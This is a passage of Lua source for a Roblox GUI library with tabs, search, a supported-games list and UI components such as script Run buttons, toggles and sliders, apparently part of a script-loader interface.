function Tab:_ApplySelection(selected)
	local theme = self.Window.Theme
	local fx = self._fx
	fx.Base = selected and theme.Accent or theme.SurfaceLight
	fx.Hover = selected and theme.AccentLight or theme.AccentDark
	fx.Refresh()
	self.Window:Tween(self.Button, TI.Fast, { TextColor3 = selected and theme.Text or theme.SubText })
end

-- Creates a standard row (used by components): rounded corners + animated border on hover
function Tab:_CreateRow(height)
	local window = self.Window
	local theme = window.Theme
	self._rowCount += 1

	local row = create("Frame", {
		Name = "Row",
		Size = UDim2.new(1, 0, 0, height),
		BackgroundColor3 = theme.Surface,
		BorderSizePixel = 0,
		LayoutOrder = self._rowCount,
		Parent = self.Page,
	})
	addCorner(row, 8)
	local stroke = window:_AddAnimatedStroke(row, 1.2, 0.75)

	window.Maid:Add(row.MouseEnter:Connect(function()
		window:Tween(stroke, TI.Fast, { Transparency = 0.05 })
	end))
	window.Maid:Add(row.MouseLeave:Connect(function()
		window:Tween(stroke, TI.Fast, { Transparency = 0.75 })
	end))

	return row, stroke
end

function Tab:GetKey()
	return self.Id and ("id:" .. tostring(self.Id)) or self.Name
end

-- Search index: components register their row + searchable text. Rows flagged hideOnSearch
-- (section headers, labels) are hidden while a query is active.
function Tab:_Index(row, text, hideOnSearch)
	table.insert(self._indexed, { Row = row, Text = string.lower(text or ""), HideOnSearch = hideOnSearch == true })
	if self._search and self._search ~= "" then
		self:_ApplySearch()
	end
end

function Tab:_ApplySearch()
	local query = string.lower(self._search or "")
	local matches = 0
	for _, entry in ipairs(self._indexed) do
		local visible
		if query == "" then
			visible = true
		elseif entry.HideOnSearch then
			visible = false
		else
			visible = string.find(entry.Text, query, 1, true) ~= nil
			if visible then
				matches += 1
			end
		end
		entry.Row.Visible = visible
	end
	if self._noResults then
		self._noResults.Visible = query ~= "" and matches == 0
	end
end

function Tab:_EnableSearch()
	local window = self.Window
	local theme = window.Theme

	local bar = create("Frame", {
		Name = "SearchBar",
		Size = UDim2.new(1, 0, 0, 32),
		BackgroundColor3 = theme.Surface,
		BorderSizePixel = 0,
		LayoutOrder = -10000,
		Parent = self.Page,
	})
	addCorner(bar, 8)
	local stroke = addStroke(bar, theme.AccentDark, 1.2, 0.3)

	local box = create("TextBox", {
		Name = "Input",
		Position = UDim2.fromOffset(12, 0),
		Size = UDim2.new(1, -44, 1, 0),
		BackgroundTransparency = 1,
		Text = "",
		PlaceholderText = "Search scripts...",
		PlaceholderColor3 = theme.SubText,
		TextColor3 = theme.Text,
		Font = Enum.Font.Gotham,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Left,
		ClearTextOnFocus = false,
		Parent = bar,
	})
	local clear = create("TextButton", {
		Name = "Clear",
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -6, 0.5, 0),
		Size = UDim2.fromOffset(24, 22),
		BackgroundColor3 = theme.SurfaceLight,
		AutoButtonColor = false,
		Text = "X",
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 11,
		BorderSizePixel = 0,
		Visible = false,
		Parent = bar,
	})
	addCorner(clear, 6)
	window:_AddButtonFx(clear, theme.SurfaceLight, theme.AccentDark)

	self._noResults = create("TextLabel", {
		Name = "NoResults",
		LayoutOrder = -9999,
		Size = UDim2.new(1, 0, 0, 24),
		BackgroundTransparency = 1,
		Text = "No scripts match your search.",
		TextColor3 = theme.SubText,
		Font = Enum.Font.Gotham,
		TextSize = 12,
		Visible = false,
		Parent = self.Page,
	})

	window.Maid:Add(box:GetPropertyChangedSignal("Text"):Connect(function()
		self._search = box.Text
		clear.Visible = box.Text ~= ""
		self:_ApplySearch()
	end))
	window.Maid:Add(box.Focused:Connect(function()
		window:Tween(stroke, TI.Fast, { Color = theme.Accent })
	end))
	window.Maid:Add(box.FocusLost:Connect(function()
		window:Tween(stroke, TI.Fast, { Color = theme.AccentDark })
	end))
	window.Maid:Add(clear.Activated:Connect(function()
		box.Text = ""
	end))

	self.SearchBox = box
end

function Window:CreateTab(identifier, options)
	if self._destroyed then
		error("[Library] The window has already been destroyed.", 2)
	end
	options = options or {}
	local isId = type(identifier) == "number"
	if not isId and type(identifier) ~= "string" then
		error("[Library] CreateTab expects a number (game ID) or a string (universal name).", 2)
	end

	-- Avoids duplicate tabs
	for _, existing in ipairs(self.Tabs) do
		if (isId and existing.Id == identifier) or (not isId and not existing.Id and existing.Name == identifier) then
			return existing
		end
	end

	local theme = self.Theme
	self._tabCounter += 1

	local tab = setmetatable({
		Window = self,
		Id = isId and identifier or nil,
		Universal = not isId,
		Internal = options.Internal == true,
		Name = isId and (options.Name or "Loading...") or identifier,
		Elements = {},
		_rowCount = 0,
		_indexed = {},
		_order = options.Internal and 9999 or self._tabCounter,
	}, Tab)
	tab.Compatible = tab:_EvaluateCompat()

	tab.Page = create("ScrollingFrame", {
		Name = "Page_" .. tostring(identifier),
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		ScrollBarThickness = 3,
		ScrollBarImageColor3 = theme.Accent,
		CanvasSize = UDim2.new(),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
		ScrollingDirection = Enum.ScrollingDirection.Y,
		Visible = false,
		Parent = self.Pages,
	})
	create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 6), Parent = tab.Page })
	addPadding(tab.Page, 4, 10, 8, 8)

	tab.Button = create("TextButton", {
		Name = "Tab_" .. tostring(identifier),
		Size = UDim2.new(0, 0, 0, 24),
		AutomaticSize = Enum.AutomaticSize.X,
		BackgroundColor3 = theme.SurfaceLight,
		AutoButtonColor = false,
		Text = tab.Name,
		TextColor3 = theme.SubText,
		Font = Enum.Font.GothamMedium,
		TextSize = 12,
		BorderSizePixel = 0,
		LayoutOrder = tab._order,
		Visible = false,
		Parent = self.TabStrip,
	})
	addCorner(tab.Button, 6)
	addPadding(tab.Button, 0, 10, 0, 10)
	tab._fx = self:_AddButtonFx(tab.Button, theme.SurfaceLight, theme.AccentDark)

	self.Maid:Add(tab.Button.Activated:Connect(function()
		self:SelectTab(tab, true)
	end))

	table.insert(self.Tabs, tab)

	if options.Search then
		tab:_EnableSearch()
	end

	if isId then
		self:_RegisterGame(identifier, options.Name)
		fetchGameInfo(identifier, function(info)
			if not self._destroyed and not options.Name then
				tab:SetName(info.Name)
			end
		end)
	end

	self:RefreshTabs()
	return tab
end

function Window:SelectTab(tab, byUser)
	if self._destroyed or not tab or not tab.Compatible then
		return
	end
	if byUser then
		self._userSelected = true
		Config:Set("lastTab", tab:GetKey())
	end
	if self.SelectedTab == tab then
		return
	end

	local previous = self.SelectedTab
	self.SelectedTab = tab
	if previous then
		previous.Page.Visible = false
		previous:_ApplySelection(false)
	end

	tab.Page.Position = UDim2.fromOffset(0, 10)
	tab.Page.Visible = true
	self:Tween(tab.Page, TI.Medium, { Position = UDim2.fromOffset(0, 0) })
	tab:_ApplySelection(true)
end

-- Re-evaluates compatibility of all tabs and updates the interface
function Window:RefreshTabs()
	if self._destroyed then
		return
	end

	local best, bestAny
	local visibleCount = 0

	for _, tab in ipairs(self.Tabs) do
		tab.Compatible = tab:_EvaluateCompat()
		tab.Button.Visible = tab.Compatible
		if not tab.Compatible then
			tab.Page.Visible = false
		else
			visibleCount += 1
			if not bestAny or tab._order < bestAny._order then
				bestAny = tab
			end
			if not tab.Internal and (not best or tab._order < best._order) then
				best = tab
			end
		end
	end

	self.EmptyLabel.Visible = visibleCount == 0

	local current = self.SelectedTab
	if current and not current.Compatible then
		self.SelectedTab = nil
		current = nil
	end

	if not current or not self._userSelected then
		local target = best or bestAny
		if target then
			self:SelectTab(target)
		end
	end
end

--==================================================================================================
-- Default tab: Game Support
--==================================================================================================
function Window:_SetupSupportTab(tab)
	local theme = self.Theme
	self.SupportTab = tab
	self.SupportHeader = create("TextLabel", {
		Name = "SupportHeader",
		LayoutOrder = -10,
		Size = UDim2.new(1, 0, 0, 18),
		BackgroundTransparency = 1,
		Text = "No game configured",
		TextColor3 = theme.SubText,
		Font = Enum.Font.GothamMedium,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = tab.Page,
	})
end

function Window:_UpdateSupportHeader()
	if self.SupportHeader then
		local count = #self.GameList
		self.SupportHeader.Text = count == 0 and "No game configured" or ("Supported games: " .. count)
	end
end

function Window:_RegisterGame(placeId, nameOverride)
	if self.GamesById[placeId] then
		return
	end
	self.GamesById[placeId] = true
	if self.SupportTab then
		self:_BuildGameCard(placeId, nameOverride)
	end
end

function Window:_BuildGameCard(placeId, nameOverride)
	local theme = self.Theme
	local tab = self.SupportTab
	local isCurrent = placeId == game.PlaceId

	local row = tab:_CreateRow(62)
	table.insert(self.GameList, { Id = placeId, Row = row })
	row.LayoutOrder = isCurrent and -1 or (100 + #self.GameList)

	local thumb = create("Frame", {
		Name = "Thumb",
		Position = UDim2.fromOffset(10, 8),
		Size = UDim2.fromOffset(46, 46),
		BackgroundColor3 = theme.SurfaceLight,
		BorderSizePixel = 0,
		ClipsDescendants = true,
		Parent = row,
	})
	addCorner(thumb, 8)
	create("TextLabel", {
		Name = "Placeholder",
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		Text = "?",
		TextColor3 = theme.SubText,
		Font = Enum.Font.GothamBold,
		TextSize = 20,
		Parent = thumb,
	})
	local image = create("ImageLabel", {
		Name = "Image",
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		ScaleType = Enum.ScaleType.Crop,
		ImageTransparency = 1,
		Parent = thumb,
	})

	local nameLabel = create("TextLabel", {
		Name = "GameName",
		Position = UDim2.fromOffset(64, 11),
		Size = UDim2.new(1, -172, 0, 18),
		BackgroundTransparency = 1,
		Text = nameOverride or "Loading...",
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 13,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})
	create("TextLabel", {
		Name = "GameId",
		Position = UDim2.fromOffset(64, 31),
		Size = UDim2.new(1, -172, 0, 16),
		BackgroundTransparency = 1,
		Text = "ID: " .. tostring(placeId),
		TextColor3 = theme.SubText,
		Font = Enum.Font.Gotham,
		TextSize = 11,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})

	-- Visual support indicator (pill)
	local pillColor = isCurrent and theme.AccentLight or theme.Success
	local pill = create("Frame", {
		Name = "SupportBadge",
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -10, 0.5, 0),
		Size = UDim2.fromOffset(92, 22),
		BackgroundColor3 = pillColor,
		BackgroundTransparency = 0.85,
		BorderSizePixel = 0,
		Parent = row,
	})
	addCorner(pill, UDim.new(1, 0))
	addStroke(pill, pillColor, 1, 0.5)
	local dot = create("Frame", {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 8, 0.5, 0),
		Size = UDim2.fromOffset(6, 6),
		BackgroundColor3 = pillColor,
		BorderSizePixel = 0,
		Parent = pill,
	})
	addCorner(dot, UDim.new(1, 0))
	create("TextLabel", {
		Position = UDim2.fromOffset(18, 0),
		Size = UDim2.new(1, -22, 1, 0),
		BackgroundTransparency = 1,
		Text = isCurrent and "Current game" or "Supported",
		TextColor3 = pillColor,
		Font = Enum.Font.GothamBold,
		TextSize = 11,
		Parent = pill,
	})

	self:_UpdateSupportHeader()

	fetchGameInfo(placeId, function(info)
		if self._destroyed or not nameLabel.Parent then
			return
		end
		if not nameOverride then
			nameLabel.Text = info.Name
		end
		image.Image = info.Icon or ("rbxthumb://type=Asset&id=" .. tostring(placeId) .. "&w=150&h=150")
		self:Tween(image, TI.Medium, { ImageTransparency = 0 })
	end)
end

--==================================================================================================
-- Component registry (extensible) + native components
--==================================================================================================
function Library:RegisterComponent(name, builder)
	assert(type(name) == "string" and type(builder) == "function", "[Library] RegisterComponent(name, function)")
	self.Components[name] = builder

	Tab["Create" .. name] = function(tab, config)
		if tab.Window._destroyed then
			return nil
		end
		local ok, result = pcall(builder, tab, config or {})
		if not ok then
			warn(("[Library] Error creating component '%s': %s"):format(name, tostring(result)))
			tab.Window:Notify({ Title = "Component error", Content = tostring(result), Type = "Error", Duration = 6 })
			return nil
		end
		table.insert(tab.Elements, result)
		return result
	end
end

-- Shared helpers for components ------------------------------------------------------------------
local function safeCall(window, label, fn, ...)
	if type(fn) ~= "function" then
		return
	end
	local ok, err = pcall(fn, ...)
	if not ok then
		warn(("[Loader] Error in '%s': %s"):format(label, tostring(err)))
		window:Log("ERR " .. label .. ": " .. tostring(err), "Error")
		window:Notify({ Title = "Error in " .. label, Content = tostring(err), Type = "Error", Duration = 6 })
	end
end

local function rowHeightFor(description)
	return (type(description) == "string" and description ~= "") and 52 or 40
end

-- Name (+ optional description) on the left side of a row; rightReserve = pixels kept free on the right
local function addRowLabels(row, theme, name, description, rightReserve, leftOffset)
	local hasDescription = type(description) == "string" and description ~= ""
	leftOffset = leftOffset or 0
	local baseY = hasDescription and math.max(math.floor((row.Size.Y.Offset - 52) / 2), 0) or 0
	create("TextLabel", {
		Name = "RowName",
		Position = UDim2.fromOffset(12 + leftOffset, (hasDescription and 8 or 0) + baseY),
		Size = UDim2.new(1, -(rightReserve + leftOffset), 0, hasDescription and 18 or row.Size.Y.Offset),
		BackgroundTransparency = 1,
		Text = name,
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 13,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})
	if hasDescription then
		create("TextLabel", {
			Name = "RowDescription",
			Position = UDim2.fromOffset(12 + leftOffset, 28 + baseY),
			Size = UDim2.new(1, -(rightReserve + leftOffset), 0, 16),
			BackgroundTransparency = 1,
			Text = description,
			TextColor3 = theme.SubText,
			Font = Enum.Font.Gotham,
			TextSize = 11,
			TextXAlignment = Enum.TextXAlignment.Left,
			TextTruncate = Enum.TextTruncate.AtEnd,
			Parent = row,
		})
	end
	return hasDescription
end

-- Component: Script (name + description + favorite star + Run/Running/Executed button) -----------
Library:RegisterComponent("Script", function(tab, config)
	local window = tab.Window
	local theme = window.Theme
	local name = tostring(config.Name or "Script")
	local description = config.Description
	local hasDescription = type(description) == "string" and description ~= ""

	local callback = config.Callback
	if type(callback) ~= "function" then
		callback = function()
			error("Callback not defined for script '" .. name .. "'.")
		end
	end

	local row = tab:_CreateRow(rowHeightFor(description))
	local baseOrder = row.LayoutOrder
	addRowLabels(row, theme, name, description, 150)
	tab:_Index(row, name .. " " .. (hasDescription and description or ""))

	local button = create("TextButton", {
		Name = "RunButton",
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -10, 0.5, 0),
		Size = UDim2.fromOffset(88, 28),
		BackgroundColor3 = theme.Accent,
		AutoButtonColor = false,
		Text = "Run",
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 12,
		BorderSizePixel = 0,
		Parent = row,
	})
	addCorner(button, 7)
	local fx = window:_AddButtonFx(button, theme.Accent, theme.AccentLight)

	-- Favorite star: favorites float to the top of the tab and are remembered in the config
	local star = create("TextButton", {
		Name = "Favorite",
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -106, 0.5, 0),
		Size = UDim2.fromOffset(26, 28),
		BackgroundColor3 = theme.SurfaceLight,
		AutoButtonColor = false,
		Text = "☆",
		TextColor3 = theme.SubText,
		Font = Enum.Font.GothamBold,
		TextSize = 15,
		BorderSizePixel = 0,
		Parent = row,
	})
	addCorner(star, 7)
	window:_AddButtonFx(star, theme.SurfaceLight, theme.AccentDark)

	local function applyFavorite()
		local favorites = Config:Get("favorites", {})
		local isFavorite = favorites[name] == true
		star.Text = isFavorite and "★" or "☆"
		star.TextColor3 = isFavorite and theme.Warning or theme.SubText
		row.LayoutOrder = isFavorite and (baseOrder - 5000) or baseOrder
	end
	applyFavorite()

	window.Maid:Add(star.Activated:Connect(function()
		local favorites = Config:Get("favorites", {})
		if favorites[name] then
			favorites[name] = nil
		else
			favorites[name] = true
		end
		Config:Set("favorites", favorites)
		applyFavorite()
	end))

	local visuals = {
		Idle = { Text = "Run", Base = theme.Accent, Hover = theme.AccentLight },
		Running = { Text = "Running", Base = theme.AccentDark, Hover = theme.AccentDark },
		Done = { Text = "Executed", Base = theme.Success:Lerp(theme.Background, 0.35), Hover = theme.Success },
	}

	local component = { Name = name, State = "Idle", Instance = row, Button = button }

	function component:SetState(state)
		local visual = visuals[state]
		if not visual or window._destroyed then
			return
		end
		self.State = state
		button.Text = visual.Text
		fx.Base, fx.Hover = visual.Base, visual.Hover
		fx.Enabled = state == "Idle" or (state == "Done" and config.AllowRerun == true)
		fx.Refresh()
	end

	function component:Reset()
		if self.State ~= "Running" then
			self:SetState("Idle")
		end
	end

	function component:Run()
		if window._destroyed or self.State == "Running" then
			return
		end
		if self.State == "Done" and config.AllowRerun ~= true then
			return
		end
		self:SetState("Running")

		task.spawn(function()
			local startedAt = os.clock()
			local ok, err = pcall(callback)

			local remaining = MIN_RUNNING_TIME - (os.clock() - startedAt)
			if remaining > 0 then
				task.wait(remaining)
			end
			if window._destroyed then
				return
			end

			if ok then
				self:SetState("Done")
				window:Log("OK  " .. name, "Success")
				window:Notify({ Title = name, Content = "Script executed successfully!", Type = "Success", Duration = 3 })
				if config.AutoMinimize ~= false and Config:Get("autoMinimize", true) then
					task.delay(0.35, function()
						if not window._destroyed and not window.State.PopupOpen then
							window:Minimize()
						end
					end)
				end
			else
				self:SetState("Idle")
				warn(("[Loader] Error running '%s': %s"):format(name, tostring(err)))
				window:Log("ERR " .. name .. ": " .. tostring(err), "Error")
				window:Notify({ Title = "Error in " .. name, Content = tostring(err), Type = "Error", Duration = 6 })
			end
		end)
	end

	window.Maid:Add(button.Activated:Connect(function()
		component:Run()
	end))

	return component
end)

-- Component: Label (single line of text) ---------------------------------------------------------
Library:RegisterComponent("Label", function(tab, config)
	local theme = tab.Window.Theme
	local row = tab:_CreateRow(30)
	tab:_Index(row, "", true)
	local label = create("TextLabel", {
		Position = UDim2.fromOffset(12, 0),
		Size = UDim2.new(1, -24, 1, 0),
		BackgroundTransparency = 1,
		Text = tostring(config.Text or ""),
		TextColor3 = config.Color or theme.SubText,
		Font = Enum.Font.Gotham,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})
	local component = { Instance = row }
	function component:SetText(text, color)
		label.Text = tostring(text)
		if color then
			label.TextColor3 = color
		end
	end
	return component
end)

-- Component: Paragraph (wrapped multi-line text; the row grows with its content) ------------------
Library:RegisterComponent("Paragraph", function(tab, config)
	local theme = tab.Window.Theme
	local row = tab:_CreateRow(30)
	row.AutomaticSize = Enum.AutomaticSize.Y
	tab:_Index(row, "", true)
	addPadding(row, 7, 12, 7, 12)
	local label = create("TextLabel", {
		Size = UDim2.new(1, 0, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		BackgroundTransparency = 1,
		Text = tostring(config.Text or ""),
		TextColor3 = config.Color or theme.SubText,
		Font = Enum.Font.Gotham,
		TextSize = config.TextSize or 12,
		TextWrapped = true,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextYAlignment = Enum.TextYAlignment.Top,
		Parent = row,
	})
	local component = { Instance = row }
	function component:SetText(text, color)
		label.Text = tostring(text)
		if color then
			label.TextColor3 = color
		end
	end
	return component
end)

-- Component: Section (small accent header that groups rows) --------------------------------------
Library:RegisterComponent("Section", function(tab, config)
	local theme = tab.Window.Theme
	tab._rowCount += 1
	local label = create("TextLabel", {
		Name = "Section",
		LayoutOrder = tab._rowCount,
		Size = UDim2.new(1, 0, 0, 20),
		BackgroundTransparency = 1,
		Text = string.upper(tostring(config.Text or "")),
		TextColor3 = theme.Accent,
		Font = Enum.Font.GothamBold,
		TextSize = 11,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = tab.Page,
	})
	addPadding(label, 0, 0, 0, 4)
	tab:_Index(label, "", true)
	local component = { Instance = label }
	function component:SetText(text)
		label.Text = string.upper(tostring(text))
	end
	return component
end)

-- Component: Stat (name on the left, live value on the right) ------------------------------------
Library:RegisterComponent("Stat", function(tab, config)
	local theme = tab.Window.Theme
	local row = tab:_CreateRow(30)
	tab:_Index(row, tostring(config.Name or ""))

	create("TextLabel", {
		Name = "StatName",
		Position = UDim2.fromOffset(12, 0),
		Size = UDim2.new(0.45, -12, 1, 0),
		BackgroundTransparency = 1,
		Text = tostring(config.Name or "Stat"),
		TextColor3 = theme.SubText,
		Font = Enum.Font.GothamMedium,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})
	local value = create("TextLabel", {
		Name = "StatValue",
		AnchorPoint = Vector2.new(1, 0),
		Position = UDim2.new(1, -12, 0, 0),
		Size = UDim2.new(0.55, -12, 1, 0),
		BackgroundTransparency = 1,
		Text = tostring(config.Value or "-"),
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Right,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})

	local component = { Instance = row }
	function component:SetValue(text, color)
		if not value.Parent then
			return
		end
		value.Text = tostring(text)
		value.TextColor3 = color or theme.Text
	end
	return component
end)

-- Component: Button (reusable action button; Callback runs in its own thread) --------------------
Library:RegisterComponent("Button", function(tab, config)
	local window = tab.Window
	local theme = window.Theme
	local name = tostring(config.Name or "Button")
	local description = config.Description
	local hasDescription = type(description) == "string" and description ~= ""
	local buttonText = tostring(config.ButtonText or "Run")

	local callback = config.Callback
	if type(callback) ~= "function" then
		callback = function()
			error("Callback not defined for button '" .. name .. "'.")
		end
	end

	local imageId = config.Image or config.Icon
	local hasImage = type(imageId) == "string" and imageId ~= ""
	local LOGO_SIZE = 46

	local row = tab:_CreateRow(hasImage and 62 or rowHeightFor(description))
	addRowLabels(row, theme, name, description, 112, hasImage and (LOGO_SIZE + 10) or 0)
	tab:_Index(row, name .. " " .. (hasDescription and description or ""))

	local button = create("TextButton", {
		Name = "ActionButton",
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -10, 0.5, 0),
		Size = UDim2.fromOffset(88, 28),
		BackgroundColor3 = theme.Accent,
		AutoButtonColor = false,
		Text = buttonText,
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 12,
		BorderSizePixel = 0,
		Parent = row,
	})
	addCorner(button, 7)

	-- logo sits at the very start (left) of the row, the name / description come after it
	local logo
	if hasImage then
		logo = create("ImageLabel", {
			Name = "ButtonLogo",
			AnchorPoint = Vector2.new(0, 0.5),
			BackgroundTransparency = 1,
			Image = imageId,
			Size = UDim2.fromOffset(LOGO_SIZE, LOGO_SIZE),
			Position = UDim2.new(0, 10, 0.5, 0),
			ScaleType = Enum.ScaleType.Fit,
			Parent = row,
		})
		addCorner(logo, 10)
	end
	local fx = window:_AddButtonFx(button, theme.Accent, theme.AccentLight)

	local component = { Name = name, Busy = false, Instance = row, Button = button, Logo = logo }

	function component:SetText(text)
		buttonText = tostring(text)
		if not self.Busy then
			button.Text = buttonText
		end
	end

	function component:Click()
		if window._destroyed or self.Busy then
			return
		end
		self.Busy = true
		button.Text = "..."
		fx.Enabled = false
		fx.Base, fx.Hover = theme.AccentDark, theme.AccentDark
		fx.Refresh()

		task.spawn(function()
			local startedAt = os.clock()
			local ok, err = pcall(callback, self)

			local remaining = MIN_RUNNING_TIME - (os.clock() - startedAt)
			if remaining > 0 then
				task.wait(remaining)
			end
			if window._destroyed then
				return
			end

			self.Busy = false
			button.Text = buttonText
			fx.Enabled = true
			fx.Base, fx.Hover = theme.Accent, theme.AccentLight
			fx.Refresh()

			if not ok then
				warn(("[Loader] Error in button '%s': %s"):format(name, tostring(err)))
				window:Log("ERR " .. name .. ": " .. tostring(err), "Error")
				window:Notify({ Title = "Error in " .. name, Content = tostring(err), Type = "Error", Duration = 6 })
			end
		end)
	end

	window.Maid:Add(button.Activated:Connect(function()
		component:Click()
	end))

	return component
end)

-- Component: Toggle (on/off switch; Flag saves it in the config; Callback(state)) ----------------
-- If the saved/default value is true, Callback(true) is fired once right after creation.
Library:RegisterComponent("Toggle", function(tab, config)
	local window = tab.Window
	local theme = window.Theme
	local name = tostring(config.Name or "Toggle")
	local description = config.Description
	local hasDescription = type(description) == "string" and description ~= ""
	local flag = config.Flag

	local value = config.Default == true
	if flag then
		value = Config:Get(flag, value) == true
	end

	local row = tab:_CreateRow(rowHeightFor(description))
	addRowLabels(row, theme, name, description, 80)
	tab:_Index(row, name .. " " .. (hasDescription and description or ""))

	local track = create("TextButton", {
		Name = "Switch",
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -12, 0.5, 0),
		Size = UDim2.fromOffset(42, 22),
		BackgroundColor3 = value and theme.Accent or theme.SurfaceLight,
		AutoButtonColor = false,
		Text = "",
		BorderSizePixel = 0,
		Parent = row,
	})
	addCorner(track, UDim.new(1, 0))
	addStroke(track, theme.AccentDark, 1, 0.4)
	local knob = create("Frame", {
		Name = "Knob",
		AnchorPoint = Vector2.new(0, 0.5),
		Position = value and UDim2.new(1, -20, 0.5, 0) or UDim2.new(0, 2, 0.5, 0),
		Size = UDim2.fromOffset(18, 18),
		BackgroundColor3 = theme.Text,
		BorderSizePixel = 0,
		Parent = track,
	})
	addCorner(knob, UDim.new(1, 0))

	local component = { Name = name, Value = value, Instance = row }

	function component:SetValue(state, silent)
		state = state == true
		if self.Value == state then
			return
		end
		self.Value = state
		window:Tween(track, TI.Fast, { BackgroundColor3 = state and theme.Accent or theme.SurfaceLight })
		window:Tween(knob, TI.Fast, { Position = state and UDim2.new(1, -20, 0.5, 0) or UDim2.new(0, 2, 0.5, 0) })
		if flag then
			Config:Set(flag, state)
		end
		if not silent then
			safeCall(window, name, config.Callback, state)
		end
	end

	window.Maid:Add(track.Activated:Connect(function()
		component:SetValue(not component.Value)
	end))

	if value and config.Callback then
		task.defer(safeCall, window, name, config.Callback, true)
	end

	return component
end)

-- Component: Slider (drag to choose a number; OnRelease = callback only when the finger lifts) ----
Library:RegisterComponent("Slider", function(tab, config)
	local window = tab.Window
	local theme = window.Theme
	local name = tostring(config.Name or "Slider")
	local min = tonumber(config.Min) or 0
	local max = tonumber(config.Max) or 100
	if max <= min then
		max = min + 1
	end
	local step = tonumber(config.Step) or 1
	local decimals = config.Decimals or (step < 1 and 2 or 0)
	local suffix = config.Suffix or ""
	local flag = config.Flag

	local function snap(v)
		v = math.clamp(tonumber(v) or min, min, max)
		if step > 0 then
			v = min + math.floor((v - min) / step + 0.5) * step
		end
		return math.clamp(math.floor(v * 10000 + 0.5) / 10000, min, max)
	end

	local value = snap(config.Default or min)
	if flag then
		value = snap(Config:Get(flag, value))
	end

	local row = tab:_CreateRow(50)
	tab:_Index(row, name)

	create("TextLabel", {
		Name = "SliderName",
		Position = UDim2.fromOffset(12, 6),
		Size = UDim2.new(1, -100, 0, 18),
		BackgroundTransparency = 1,
		Text = name,
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 13,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = row,
	})
	local valueLabel = create("TextLabel", {
		Name = "SliderValue",
		AnchorPoint = Vector2.new(1, 0),
		Position = UDim2.new(1, -12, 0, 6),
		Size = UDim2.fromOffset(80, 18),
		BackgroundTransparency = 1,
		Text = "",
		TextColor3 = theme.AccentLight,
		Font = Enum.Font.GothamBold,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Right,
		Parent = row,
	})

	local track = create("Frame", {
		Name = "Track",
		Position = UDim2.fromOffset(12, 34),
		Size = UDim2.new(1, -24, 0, 6),
		BackgroundColor3 = theme.SurfaceLight,
		BorderSizePixel = 0,
		Parent = row,
	})
	addCorner(track, UDim.new(1, 0))
	local fill = create("Frame", {
		Name = "Fill",
		Size = UDim2.fromScale(0, 1),
		BackgroundColor3 = theme.Accent,
		BorderSizePixel = 0,
		Parent = track,
	})
	addCorner(fill, UDim.new(1, 0))
	local knob = create("Frame", {
		Name = "Knob",
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0, 0.5),
		Size = UDim2.fromOffset(14, 14),
		BackgroundColor3 = theme.Text,
		BorderSizePixel = 0,
		ZIndex = 2,
		Parent = track,
	})
	addCorner(knob, UDim.new(1, 0))
	-- Larger invisible hit area makes the slider easy to grab on touch screens
	local hit = create("TextButton", {
		Name = "Hit",
		Position = UDim2.fromOffset(12, 24),
		Size = UDim2.new(1, -24, 0, 24),
		BackgroundTransparency = 1,
		AutoButtonColor = false,
		Text = "",
		ZIndex = 3,
		Parent = row,
	})

	local component = { Name = name, Value = value, Instance = row }

	local function render()
		local alpha = (component.Value - min) / (max - min)
		fill.Size = UDim2.fromScale(alpha, 1)
		knob.Position = UDim2.fromScale(alpha, 0.5)
		valueLabel.Text = string.format("%." .. tostring(decimals) .. "f", component.Value) .. suffix
	end
	render()

	function component:SetValue(v, silent, dragging)
		v = snap(v)
		if v == self.Value then
			return
		end
		self.Value = v
		render()
		if flag then
			Config:Set(flag, v)
		end
		if not silent and not (config.OnRelease and dragging) then
			safeCall(window, name, config.Callback, v)
		end
	end

	local dragging, dragInput, changed = false, nil, false

	local function setFromX(x)
		local width = track.AbsoluteSize.X
		if width <= 0 then
			return
		end
		local alpha = math.clamp((x - track.AbsolutePosition.X) / width, 0, 1)
		local before = component.Value
